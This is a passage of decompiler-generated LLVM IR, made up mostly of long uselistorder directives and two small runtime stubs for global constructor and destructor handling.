  uselistorder i32 -1, { 543, 544, 80, 483, 484, 312, 197, 485, 81, 486, 68, 82, 487, 83, 488, 198, 189, 199, 201, 200, 202, 63, 545, 546, 313, 489, 314, 69, 315, 84, 85, 374, 375, 376, 377, 490, 86, 550, 203, 9, 10, 551, 552, 70, 553, 554, 378, 34, 87, 547, 316, 595, 37, 38, 39, 596, 317, 599, 35, 36, 190, 491, 40, 496, 497, 498, 206, 499, 500, 501, 502, 503, 504, 505, 204, 506, 205, 508, 509, 510, 511, 21, 64, 207, 208, 209, 210, 379, 318, 168, 380, 381, 211, 319, 181, 382, 41, 22, 88, 364, 212, 71, 365, 42, 366, 367, 191, 213, 548, 368, 383, 214, 384, 385, 386, 320, 555, 321, 72, 11, 322, 556, 557, 323, 324, 325, 558, 326, 512, 513, 43, 44, 45, 327, 514, 515, 328, 492, 493, 494, 65, 559, 560, 561, 192, 73, 562, 563, 564, 565, 215, 566, 12, 89, 567, 568, 569, 570, 571, 329, 572, 216, 573, 574, 217, 13, 14, 218, 74, 575, 330, 444, 331, 576, 577, 578, 579, 90, 603, 219, 91, 92, 93, 94, 95, 96, 97, 98, 0, 615, 613, 446, 99, 469, 470, 220, 332, 471, 48, 49, 333, 472, 46, 47, 334, 100, 604, 473, 15, 221, 101, 102, 474, 222, 387, 16, 103, 75, 536, 50, 51, 335, 223, 169, 537, 104, 388, 600, 601, 61, 608, 598, 475, 105, 476, 336, 477, 52, 53, 478, 479, 422, 76, 609, 77, 458, 78, 389, 1, 193, 390, 170, 391, 224, 392, 393, 2, 394, 395, 337, 516, 171, 517, 518, 225, 522, 523, 106, 448, 396, 397, 172, 173, 108, 107, 398, 66, 67, 399, 400, 401, 338, 114, 112, 110, 402, 403, 404, 113, 111, 109, 405, 406, 339, 407, 340, 507, 32, 33, 115, 465, 226, 369, 370, 371, 372, 227, 616, 617, 580, 447, 116, 341, 342, 519, 520, 343, 521, 344, 345, 182, 346, 347, 348, 349, 350, 54, 351, 228, 117, 118, 524, 525, 526, 495, 174, 527, 528, 529, 23, 24, 25, 26, 27, 28, 29, 178, 179, 581, 20, 582, 17, 583, 584, 352, 229, 30, 353, 585, 586, 3, 588, 589, 4, 230, 231, 354, 55, 232, 194, 590, 233, 587, 591, 530, 18, 31, 180, 234, 541, 19, 235, 445, 542, 236, 531, 237, 532, 238, 119, 120, 239, 121, 122, 123, 610, 611, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 549, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 614, 155, 618, 156, 408, 409, 410, 411, 412, 157, 413, 414, 415, 416, 417, 418, 419, 420, 612, 175, 421, 355, 423, 158, 597, 159, 592, 593, 594, 160, 424, 425, 240, 241, 426, 242, 427, 428, 243, 79, 429, 430, 161, 5, 6, 605, 356, 357, 358, 359, 360, 195, 361, 362, 196, 363, 183, 432, 244, 56, 431, 245, 373, 433, 434, 57, 606, 58, 607, 59, 602, 435, 176, 7, 8, 62, 436, 437, 438, 459, 246, 162, 163, 460, 461, 462, 463, 538, 539, 439, 60, 164, 440, 441, 442, 443, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 263, 262, 264, 265, 266, 449, 267, 268, 269, 450, 451, 452, 270, 453, 454, 271, 480, 272, 273, 274, 455, 184, 275, 276, 277, 456, 185, 278, 279, 280, 457, 281, 282, 283, 284, 464, 285, 286, 287, 288, 289, 290, 466, 186, 291, 292, 293, 467, 294, 295, 296, 468, 187, 297, 298, 299, 300, 301, 481, 177, 302, 482, 303, 304, 533, 167, 166, 165, 534, 305, 535, 306, 307, 308, 309, 188, 540, 310, 311 }
  uselistorder i32 1, { 278, 2065, 637, 2066, 894, 2067, 2068, 157, 158, 156, 159, 1752, 1138, 1137, 638, 639, 641, 640, 1695, 1139, 642, 1753, 2235, 645, 643, 646, 644, 647, 2069, 771, 2070, 777, 2073, 2074, 2075, 2076, 2077, 895, 2078, 2079, 2080, 86, 87, 85, 88, 2081, 2082, 2083, 1140, 90, 91, 89, 92, 2090, 47, 48, 2091, 258, 2092, 242, 240, 239, 241, 788, 1736, 1737, 896, 1738, 18, 15, 17, 16, 772, 1696, 1697, 756, 304, 305, 303, 299, 300, 301, 302, 1144, 1143, 1142, 1141, 582, 1148, 1147, 1146, 1145, 579, 897, 2249, 2313, 1151, 1150, 1149, 2236, 1152, 19, 21, 20, 22, 851, 1153, 614, 0, 898, 789, 1965, 1966, 1967, 2093, 2094, 2095, 2096, 2097, 2098, 2099, 2100, 2101, 2102, 2103, 2104, 2105, 2106, 2107, 2108, 185, 183, 182, 187, 184, 186, 778, 1968, 351, 1700, 1698, 1699, 790, 791, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 561, 560, 562, 563, 564, 2242, 1154, 281, 280, 188, 189, 274, 779, 2250, 137, 138, 136, 113, 2251, 2252, 1156, 1155, 114, 115, 1713, 1157, 271, 270, 648, 652, 649, 651, 650, 2314, 899, 2315, 2316, 1158, 653, 654, 84, 83, 82, 345, 344, 2317, 900, 901, 1160, 1159, 634, 632, 631, 633, 1161, 1162, 2109, 2110, 751, 2111, 2115, 2116, 2117, 2118, 2119, 1164, 1163, 655, 656, 658, 657, 2126, 2127, 2128, 2129, 2130, 745, 2131, 2132, 792, 2133, 2134, 841, 842, 902, 793, 831, 2135, 2136, 904, 852, 2137, 2138, 905, 2152, 2153, 2154, 2155, 903, 2156, 1170, 1169, 1168, 1167, 1114, 1166, 1165, 75, 73, 72, 76, 74, 77, 2084, 2085, 2086, 2087, 2088, 2089, 528, 529, 1709, 1710, 757, 1173, 1172, 1171, 662, 663, 664, 659, 660, 661, 1174, 621, 620, 1175, 536, 537, 1176, 1711, 1177, 415, 1178, 1712, 1179, 80, 906, 1714, 1180, 1715, 1181, 1182, 1716, 1717, 1718, 1719, 1720, 1183, 37, 39, 38, 36, 1673, 572, 571, 573, 1674, 567, 566, 565, 1675, 94, 1676, 96, 95, 277, 1677, 276, 275, 1678, 97, 1679, 343, 342, 794, 2237, 2238, 2241, 51, 52, 795, 1739, 1740, 1741, 1742, 1184, 282, 196, 197, 796, 2239, 2240, 198, 1721, 1722, 1723, 1185, 165, 164, 1724, 1115, 169, 1725, 1116, 171, 170, 1726, 1727, 1728, 1117, 161, 160, 797, 1729, 1730, 907, 1187, 1186, 667, 668, 665, 666, 669, 798, 1731, 1732, 908, 1189, 1188, 671, 672, 673, 670, 674, 2244, 2245, 2246, 1190, 675, 1733, 1734, 1735, 1118, 163, 162, 2243, 1, 1191, 1743, 1744, 799, 773, 1745, 1746, 853, 1194, 1193, 1192, 600, 603, 602, 601, 598, 599, 597, 605, 604, 606, 544, 1747, 1748, 909, 334, 335, 1749, 1750, 1751, 336, 800, 1195, 1196, 1754, 1197, 297, 295, 296, 298, 910, 1755, 801, 802, 1201, 1200, 1199, 1198, 293, 292, 1756, 803, 279, 1757, 1758, 93, 804, 1759, 1760, 147, 148, 149, 255, 1203, 1202, 1119, 393, 2247, 911, 1206, 1205, 1204, 913, 854, 805, 1680, 912, 1681, 1682, 1217, 1216, 1215, 1214, 1213, 1212, 1211, 1120, 1210, 1209, 1208, 1207, 494, 485, 483, 484, 495, 492, 490, 489, 491, 487, 493, 486, 488, 1218, 843, 2248, 1221, 1220, 1219, 269, 266, 265, 267, 268, 2, 3, 4, 5, 580, 6, 155, 7, 881, 619, 1761, 914, 1762, 1231, 1230, 1229, 1228, 1227, 1226, 1225, 1224, 1223, 1222, 532, 531, 530, 533, 534, 407, 1969, 1970, 676, 677, 1971, 519, 518, 517, 520, 2253, 2254, 548, 549, 552, 551, 550, 2255, 2256, 915, 2257, 2258, 408, 410, 409, 414, 411, 413, 412, 916, 2120, 2121, 1121, 218, 220, 219, 919, 2259, 2260, 2261, 917, 2262, 918, 2263, 2264, 2265, 2266, 2267, 1242, 1241, 1240, 1239, 1238, 1237, 1236, 1235, 1234, 1233, 1122, 1232, 211, 204, 210, 208, 203, 209, 214, 212, 207, 213, 202, 206, 215, 205, 216, 217, 201, 200, 199, 2268, 882, 194, 193, 192, 190, 191, 195, 679, 678, 680, 2324, 2325, 79, 78, 2269, 2270, 1243, 683, 681, 684, 682, 806, 2271, 1246, 1245, 1244, 263, 261, 685, 257, 256, 499, 686, 306, 921, 920, 687, 922, 1247, 238, 923, 856, 855, 1248, 807, 1667, 273, 2026, 1252, 1251, 1250, 1249, 576, 578, 574, 577, 575, 2027, 1255, 1254, 1253, 526, 525, 527, 524, 264, 2344, 1256, 2028, 2029, 2030, 883, 2031, 27, 924, 2032, 808, 925, 926, 927, 928, 1257, 1763, 33, 29, 35, 31, 28, 32, 30, 34, 2218, 809, 2219, 1258, 690, 688, 691, 692, 689, 139, 140, 143, 142, 141, 146, 145, 144, 2220, 1259, 1764, 1260, 1765, 1261, 294, 2223, 1263, 1262, 61, 774, 1264, 693, 2318, 694, 929, 930, 1267, 1266, 1265, 373, 374, 372, 371, 810, 583, 285, 245, 1270, 1269, 1268, 135, 857, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1766, 811, 1767, 1768, 1769, 1286, 1285, 1284, 119, 124, 120, 121, 122, 123, 125, 126, 1770, 812, 1771, 1772, 1773, 1289, 1288, 1287, 554, 553, 555, 556, 884, 885, 2157, 813, 931, 2158, 2159, 858, 2160, 2170, 1292, 1291, 1290, 132, 130, 129, 131, 128, 1293, 1294, 1295, 1934, 134, 133, 8, 2171, 2172, 2173, 2174, 814, 523, 752, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1782, 1783, 1784, 1297, 1296, 325, 327, 326, 324, 329, 328, 1785, 1786, 1787, 1788, 1298, 1132, 405, 395, 398, 394, 400, 402, 404, 403, 399, 401, 396, 406, 397, 815, 2139, 2140, 758, 2141, 2142, 2143, 2144, 2146, 2147, 1299, 354, 356, 355, 886, 2151, 2148, 2149, 2150, 1300, 391, 390, 387, 389, 392, 386, 385, 388, 384, 383, 2003, 2004, 2005, 1302, 1123, 1301, 63, 69, 66, 64, 62, 68, 65, 67, 71, 70, 1683, 1684, 1685, 1686, 1687, 932, 1688, 933, 1689, 1690, 1691, 1692, 1693, 1316, 1315, 1314, 1313, 1312, 1311, 1310, 1309, 1124, 1308, 1307, 1306, 1305, 1304, 1303, 232, 234, 228, 229, 230, 225, 226, 227, 231, 233, 1694, 1320, 1319, 1318, 1317, 584, 2349, 1322, 1321, 695, 1324, 1323, 236, 235, 237, 1789, 1325, 2112, 1926, 1927, 1928, 45, 44, 43, 40, 42, 41, 2071, 2072, 2272, 1326, 696, 697, 1906, 1907, 1908, 1909, 1910, 1911, 1912, 1913, 1914, 1916, 1915, 1917, 1918, 246, 251, 249, 248, 250, 247, 780, 2273, 2161, 2162, 2163, 2164, 2165, 2166, 2167, 2168, 2169, 362, 364, 363, 365, 2177, 2175, 2176, 2179, 2178, 2274, 2275, 2276, 2180, 759, 152, 151, 150, 2114, 2113, 781, 2145, 377, 2358, 2359, 700, 701, 698, 699, 2354, 2355, 2356, 2357, 704, 703, 702, 127, 934, 2181, 2182, 2183, 1125, 117, 116, 118, 859, 2122, 2123, 2124, 832, 782, 341, 340, 339, 2184, 2185, 2186, 2187, 1327, 46, 2188, 816, 2189, 2190, 1329, 1328, 2191, 2192, 2193, 1330, 260, 259, 2125, 1331, 368, 367, 366, 1850, 1332, 636, 635, 2277, 2278, 936, 2279, 2280, 2281, 2282, 2283, 2284, 2286, 2287, 2288, 937, 2289, 2290, 817, 935, 2291, 938, 2292, 2293, 2294, 2285, 1336, 1335, 1334, 1333, 104, 101, 103, 100, 98, 99, 105, 102, 2295, 2296, 2297, 2298, 2299, 708, 705, 706, 709, 707, 939, 319, 320, 2300, 2301, 108, 106, 107, 2303, 818, 2304, 775, 819, 2306, 2307, 2308, 2309, 820, 2311, 828, 2310, 2305, 1126, 1343, 1342, 1341, 1340, 1339, 1338, 1337, 713, 715, 716, 710, 714, 711, 717, 712, 783, 784, 430, 431, 432, 2302, 860, 1127, 2312, 1344, 718, 940, 610, 2351, 861, 2352, 2353, 2194, 2195, 2196, 2197, 2198, 2199, 2200, 2201, 785, 1346, 1345, 111, 109, 112, 110, 1885, 1886, 862, 1348, 1347, 289, 290, 1887, 1350, 1349, 434, 1352, 1351, 720, 721, 719, 1876, 1353, 1355, 1354, 1357, 1356, 1359, 1358, 1361, 1360, 2202, 2203, 2204, 2205, 2206, 1363, 1362, 254, 515, 630, 559, 607, 522, 722, 272, 262, 557, 723, 286, 346, 618, 322, 308, 481, 307, 622, 1364, 1365, 724, 725, 447, 591, 309, 360, 543, 821, 472, 1366, 502, 503, 478, 445, 446, 740, 741, 742, 1367, 479, 435, 439, 361, 1368, 348, 1369, 609, 623, 1370, 13, 14, 581, 2350, 1371, 726, 941, 1791, 1790, 864, 863, 332, 331, 333, 330, 942, 1793, 1792, 865, 629, 627, 628, 624, 626, 625, 2345, 2335, 822, 728, 727, 729, 823, 1805, 1806, 252, 253, 2330, 2331, 2329, 1372, 535, 181, 592, 593, 594, 2336, 2337, 2338, 2340, 746, 2339, 2341, 507, 506, 508, 482, 1794, 943, 172, 501, 1795, 944, 1796, 1797, 1798, 1799, 1376, 1375, 1374, 1373, 173, 1378, 1377, 540, 539, 541, 542, 538, 945, 1800, 1379, 244, 243, 946, 947, 948, 1380, 49, 1382, 1381, 380, 379, 381, 382, 378, 1801, 1383, 376, 1803, 949, 1384, 375, 370, 1804, 950, 1385, 369, 50, 546, 473, 474, 1802, 353, 352, 1387, 1386, 730, 732, 731, 1807, 1809, 1808, 323, 2326, 2328, 2327, 516, 2319, 2320, 2322, 760, 2323, 1388, 2346, 2348, 2347, 291, 824, 2332, 951, 2334, 2333, 1810, 223, 224, 504, 825, 1668, 1669, 1670, 953, 1671, 1672, 1812, 954, 1811, 1813, 952, 1814, 1815, 955, 1392, 1391, 1390, 1389, 459, 448, 449, 450, 455, 465, 451, 452, 467, 453, 454, 468, 466, 462, 456, 460, 461, 463, 458, 457, 464, 469, 956, 844, 1393, 958, 957, 1394, 959, 1395, 826, 827, 960, 1396, 349, 1397, 545, 615, 2342, 1399, 1398, 166, 168, 167, 2343, 1400, 734, 733, 616, 617, 586, 590, 2321, 1401, 350, 1816, 1818, 1402, 585, 284, 283, 1819, 337, 1817, 288, 287, 569, 568, 54, 53, 735, 736, 438, 436, 437, 55, 56, 57, 444, 443, 442, 440, 441, 174, 175, 176, 177, 961, 178, 179, 180, 1820, 475, 1821, 1822, 1823, 23, 25, 24, 497, 496, 498, 962, 425, 963, 1404, 1403, 738, 737, 1406, 1405, 964, 965, 1408, 1407, 321, 966, 967, 1997, 1413, 1412, 1411, 1410, 1409, 318, 317, 968, 1415, 1414, 739, 1416, 433, 1417, 969, 1824, 970, 1825, 1421, 1420, 1419, 1418, 338, 1826, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 347, 1433, 313, 312, 316, 315, 314, 1434, 521, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 424, 423, 422, 421, 420, 419, 1445, 1446, 1447, 1448, 514, 513, 512, 511, 510, 509, 971, 972, 570, 1449, 744, 743, 1827, 1828, 1829, 1830, 1831, 1832, 975, 845, 1833, 1834, 750, 973, 974, 976, 1835, 977, 1836, 1837, 747, 829, 978, 1128, 1455, 1454, 1453, 1452, 1451, 1450, 1838, 547, 979, 866, 867, 868, 980, 981, 869, 1460, 1459, 1458, 1457, 1456, 1839, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 1462, 1461, 1129, 26, 1851, 834, 830, 1852, 1853, 1854, 1855, 833, 1856, 1857, 1858, 1859, 1860, 991, 1861, 990, 1862, 989, 1863, 988, 1864, 987, 1865, 986, 1866, 985, 1867, 984, 1868, 983, 1869, 982, 1870, 1871, 1872, 1873, 1874, 1467, 1466, 1465, 1464, 1463, 417, 416, 767, 1875, 1468, 1469, 1877, 505, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1878, 1879, 1037, 1880, 1881, 1882, 1038, 769, 1883, 1039, 1884, 1481, 1480, 1479, 1478, 1477, 1476, 1475, 1474, 1473, 1472, 1471, 1470, 608, 1040, 1888, 1889, 1041, 1890, 1891, 1892, 1042, 1893, 1894, 1043, 1895, 1896, 1897, 1044, 1898, 1899, 1045, 1900, 1489, 1488, 1487, 1486, 1485, 1484, 1483, 1482, 558, 1901, 1491, 1490, 1493, 1492, 1902, 1046, 1494, 1903, 1904, 1047, 1048, 1905, 1498, 1497, 1496, 1495, 887, 870, 1919, 1049, 1050, 1921, 761, 1920, 1051, 1501, 1500, 1499, 748, 1922, 1923, 1052, 1053, 1054, 1929, 1130, 871, 872, 1055, 1924, 1056, 1925, 762, 1509, 1508, 1507, 1506, 1505, 1504, 1503, 1502, 768, 1930, 1931, 888, 1932, 1057, 1933, 763, 1512, 1511, 1510, 1513, 1935, 1936, 1059, 1937, 764, 873, 1938, 1939, 1058, 1940, 1060, 1523, 1522, 1521, 1520, 1519, 1518, 1517, 1516, 1515, 1514, 1941, 874, 1942, 1943, 1061, 1944, 765, 1062, 1533, 1532, 1531, 1530, 1529, 1528, 1527, 1526, 1525, 1524, 1945, 1063, 1535, 1534, 875, 1064, 1065, 1538, 1537, 1536, 1946, 1540, 1539, 1947, 1066, 1546, 1545, 1544, 1543, 1542, 1541, 1547, 1549, 1548, 1948, 1949, 876, 1956, 1957, 839, 1958, 1550, 846, 9, 1552, 1551, 787, 1950, 1951, 786, 1954, 1955, 1067, 1069, 1068, 1952, 1953, 1553, 81, 1959, 889, 1554, 1960, 1070, 1558, 1557, 1556, 1555, 2038, 10, 2039, 1961, 1962, 1963, 877, 878, 1559, 1964, 11, 480, 1972, 1973, 1569, 1568, 1567, 1566, 1565, 1564, 1563, 1562, 1561, 1560, 1974, 1975, 1578, 1577, 1576, 1575, 1574, 1573, 1572, 1571, 1570, 1976, 847, 1582, 1581, 1580, 1579, 1977, 1978, 1979, 1980, 1585, 1584, 1583, 311, 310, 1981, 1982, 1071, 1587, 1586, 1983, 1984, 1985, 1986, 1987, 1590, 1589, 1588, 428, 427, 1988, 1989, 1072, 1592, 1591, 1073, 1594, 1593, 154, 153, 1990, 1991, 1992, 1993, 1596, 1595, 1994, 1995, 1074, 1599, 1598, 1597, 1601, 1600, 60, 58, 59, 1075, 1076, 1077, 1078, 1996, 1602, 1998, 1999, 2000, 1604, 1603, 477, 476, 2001, 2002, 1079, 1607, 1606, 1605, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 848, 2006, 1098, 2007, 1099, 2008, 1611, 1610, 1609, 1608, 2009, 2010, 2011, 2012, 1614, 1613, 1612, 589, 587, 588, 2013, 2014, 1100, 1616, 1615, 1618, 1617, 222, 221, 2015, 1619, 2016, 2017, 2018, 1621, 1620, 359, 358, 357, 1101, 1624, 1623, 1622, 2019, 2020, 2021, 2022, 1627, 1626, 1625, 613, 611, 612, 2023, 2024, 1102, 1629, 1628, 2025, 2033, 2034, 1633, 1632, 1631, 1630, 429, 2035, 840, 2036, 2037, 1636, 1635, 1134, 1634, 1133, 470, 471, 2040, 2041, 1103, 2042, 1104, 2043, 1105, 2044, 849, 1638, 1637, 1131, 418, 2045, 2046, 2047, 2048, 2049, 2050, 2051, 2052, 2053, 2054, 2055, 2056, 1106, 2057, 776, 2058, 2059, 749, 2060, 1644, 1643, 1642, 1641, 1640, 1639, 596, 595, 2061, 2062, 753, 1646, 1645, 2063, 2064, 2207, 2208, 1107, 2209, 2210, 2211, 1108, 770, 2212, 1109, 2213, 1653, 1652, 1651, 1650, 1649, 1648, 1647, 426, 835, 754, 2214, 836, 879, 2215, 1110, 2217, 766, 850, 2216, 1111, 1112, 1113, 1659, 1658, 1657, 1656, 1655, 1654, 2221, 2222, 2224, 2225, 880, 2226, 12, 2227, 1662, 1661, 1660, 891, 2228, 2229, 890, 2230, 2231, 892, 893, 2232, 2233, 1664, 1663, 837, 755, 2234, 838, 1666, 1665, 500, 1135, 1136 }
  uselistorder label %dec_label_pc_10028890, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_100288d0 = load i32, i32* @r3, align 4
  ret i32 %v0_100288d0

; uselistorder directives
  uselistorder i32* @r3, { 62, 63, 696, 699, 697, 698, 0, 243, 148, 149, 244, 246, 247, 249, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 248, 159, 245, 795, 700, 26, 701, 233, 133, 234, 64, 250, 822, 823, 872, 873, 140, 797, 798, 235, 236, 102, 799, 803, 103, 104, 27, 509, 510, 28, 203, 204, 205, 8, 804, 65, 824, 825, 66, 131, 218, 206, 875, 876, 207, 67, 884, 888, 890, 877, 878, 141, 879, 880, 57, 68, 703, 704, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 29, 719, 726, 727, 728, 729, 730, 731, 732, 702, 208, 209, 210, 211, 212, 213, 214, 215, 130, 69, 216, 70, 217, 219, 220, 222, 223, 224, 225, 226, 132, 1, 221, 9, 160, 161, 71, 800, 801, 72, 237, 238, 239, 240, 73, 227, 228, 229, 230, 231, 232, 74, 807, 808, 809, 810, 811, 805, 806, 241, 242, 251, 891, 252, 253, 254, 75, 802, 255, 76, 256, 257, 258, 77, 812, 813, 814, 815, 78, 259, 260, 261, 79, 816, 162, 163, 164, 2, 165, 166, 167, 817, 818, 819, 820, 821, 80, 262, 263, 892, 511, 512, 30, 513, 514, 515, 81, 826, 827, 828, 829, 830, 31, 733, 124, 82, 831, 832, 833, 834, 835, 836, 837, 838, 10, 7, 839, 840, 841, 83, 874, 909, 910, 911, 912, 913, 914, 915, 147, 969, 971, 11, 84, 12, 122, 647, 648, 649, 145, 950, 137, 768, 769, 770, 771, 772, 773, 774, 264, 265, 266, 779, 58, 921, 925, 926, 142, 897, 893, 894, 895, 896, 951, 889, 650, 651, 652, 367, 881, 882, 796, 267, 268, 269, 270, 271, 272, 32, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 734, 735, 736, 737, 738, 739, 740, 284, 285, 286, 287, 288, 720, 723, 724, 725, 601, 602, 33, 172, 168, 169, 170, 171, 3, 173, 174, 175, 176, 177, 178, 126, 179, 180, 181, 85, 86, 87, 88, 962, 963, 964, 965, 146, 138, 705, 89, 13, 842, 843, 844, 845, 846, 721, 722, 34, 90, 970, 91, 968, 847, 92, 741, 742, 743, 744, 745, 746, 747, 93, 748, 749, 750, 751, 706, 394, 848, 94, 849, 850, 851, 14, 18, 15, 852, 16, 853, 17, 854, 855, 856, 857, 858, 859, 95, 96, 860, 861, 862, 863, 864, 865, 182, 866, 867, 868, 869, 916, 917, 918, 919, 920, 966, 967, 752, 753, 754, 755, 756, 757, 758, 451, 452, 453, 135, 454, 455, 456, 790, 791, 792, 437, 134, 438, 439, 870, 871, 759, 760, 761, 762, 568, 123, 569, 60, 953, 954, 35, 955, 927, 928, 19, 929, 930, 320, 321, 958, 959, 922, 931, 932, 933, 289, 290, 291, 292, 295, 293, 294, 36, 296, 297, 298, 299, 300, 301, 885, 886, 887, 883, 97, 302, 303, 304, 305, 98, 306, 307, 308, 309, 310, 311, 312, 99, 183, 184, 100, 313, 37, 314, 317, 101, 318, 118, 315, 316, 20, 105, 107, 319, 322, 323, 185, 900, 901, 960, 961, 782, 22, 923, 21, 924, 324, 325, 150, 151, 125, 152, 153, 154, 155, 326, 332, 333, 334, 335, 327, 328, 39, 329, 38, 330, 331, 186, 187, 188, 23, 336, 337, 338, 339, 340, 341, 108, 934, 935, 936, 937, 940, 941, 942, 943, 944, 945, 946, 143, 947, 948, 938, 939, 109, 110, 111, 342, 343, 61, 189, 190, 112, 902, 903, 4, 904, 905, 906, 344, 345, 346, 347, 348, 349, 350, 351, 898, 899, 113, 907, 908, 24, 114, 144, 121, 949, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 115, 127, 106, 191, 128, 129, 570, 116, 571, 572, 573, 136, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 365, 783, 366, 956, 957, 952, 368, 369, 117, 192, 370, 371, 59, 784, 785, 786, 787, 25, 40, 372, 373, 374, 41, 375, 42, 376, 377, 378, 379, 380, 381, 382, 383, 384, 43, 385, 386, 387, 47, 46, 388, 389, 390, 391, 45, 44, 392, 393, 395, 396, 397, 398, 52, 399, 51, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 50, 432, 433, 434, 49, 435, 48, 436, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 5, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 156, 157, 158, 467, 468, 469, 470, 471, 472, 473, 53, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 668, 669, 503, 504, 505, 506, 507, 508, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 665, 663, 664, 54, 666, 667, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 55, 686, 687, 688, 56, 689, 690, 691, 692, 693, 694, 695, 763, 764, 765, 6, 766, 767, 775, 776, 778, 777, 780, 781, 788, 789, 793, 794, 119, 120, 139 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268601572, i32* @lr, align 4
  %v0_100288e0 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_100288e0

; uselistorder directives
  uselistorder i32 0, { 3016, 3017, 3018, 3021, 3019, 0, 3020, 3022, 272, 2307, 2308, 273, 769, 770, 2171, 2309, 2306, 274, 1, 3248, 3038, 3025, 3028, 3029, 3030, 771, 3031, 3032, 3034, 3033, 3035, 3036, 3037, 3039, 3040, 3041, 3042, 3023, 3024, 3026, 3027, 275, 3043, 3045, 3046, 3044, 3047, 3053, 3054, 3055, 592, 1944, 3056, 593, 1945, 1946, 276, 2269, 772, 2270, 277, 2271, 2272, 2273, 2274, 2275, 106, 2172, 179, 2317, 742, 743, 773, 2310, 2311, 744, 745, 3249, 3293, 774, 3294, 3297, 3296, 471, 600, 3250, 746, 747, 748, 749, 1947, 2276, 2277, 2278, 2287, 278, 3252, 775, 3265, 3266, 3267, 279, 1997, 2, 269, 2318, 2319, 2320, 2321, 2322, 240, 107, 2800, 3057, 472, 3058, 3059, 3060, 2801, 473, 280, 2173, 2174, 2175, 2176, 281, 282, 2177, 1948, 2178, 2179, 2180, 2181, 776, 2182, 2183, 3268, 3298, 3299, 3061, 3062, 3063, 3064, 3065, 3066, 3067, 3302, 91, 3303, 284, 283, 3304, 3305, 3306, 285, 3068, 3069, 3070, 3072, 3307, 3308, 3309, 3310, 3311, 3312, 3313, 3314, 2226, 2227, 2228, 2229, 92, 3, 2184, 2185, 2186, 2187, 2188, 3497, 2191, 2189, 2190, 182, 4, 3269, 3270, 777, 3520, 185, 778, 3521, 3525, 779, 3526, 3527, 183, 184, 3528, 5, 3502, 3498, 3499, 3500, 3501, 474, 3503, 3504, 3505, 3506, 3507, 780, 3508, 3509, 602, 601, 750, 751, 752, 781, 782, 783, 3081, 3073, 784, 186, 3074, 3075, 3077, 108, 3079, 3080, 3090, 3091, 3092, 3093, 3094, 3095, 603, 587, 588, 785, 3096, 3097, 3098, 3100, 475, 3103, 786, 604, 3106, 3127, 3128, 3129, 3130, 3131, 3102, 3099, 3101, 3104, 3132, 594, 3133, 3134, 3135, 109, 3050, 286, 3048, 3049, 187, 3051, 3052, 2192, 2193, 787, 2194, 2195, 189, 180, 2196, 2197, 110, 2198, 188, 181, 2199, 2200, 2201, 2202, 2203, 2204, 2205, 605, 2206, 2207, 2208, 287, 2209, 2210, 2211, 288, 2212, 2213, 2214, 595, 1949, 2215, 2221, 2216, 2217, 2219, 2218, 190, 2220, 596, 1950, 2222, 2224, 2225, 2223, 2230, 2231, 788, 789, 2232, 2235, 790, 2237, 289, 2236, 2238, 2239, 2240, 2241, 2242, 2243, 2244, 191, 2245, 2246, 791, 290, 2233, 2234, 291, 1998, 292, 1999, 293, 2000, 294, 2001, 295, 2002, 296, 2003, 297, 2004, 298, 2005, 299, 3253, 792, 3254, 3260, 3261, 3262, 1951, 3263, 1952, 300, 2279, 793, 2280, 2281, 2282, 1953, 2283, 2284, 2285, 2286, 301, 2336, 2337, 2338, 302, 3255, 3256, 3257, 1954, 232, 3258, 3259, 2247, 1955, 2248, 1956, 1957, 303, 2249, 2250, 304, 2251, 2252, 2253, 2254, 1958, 305, 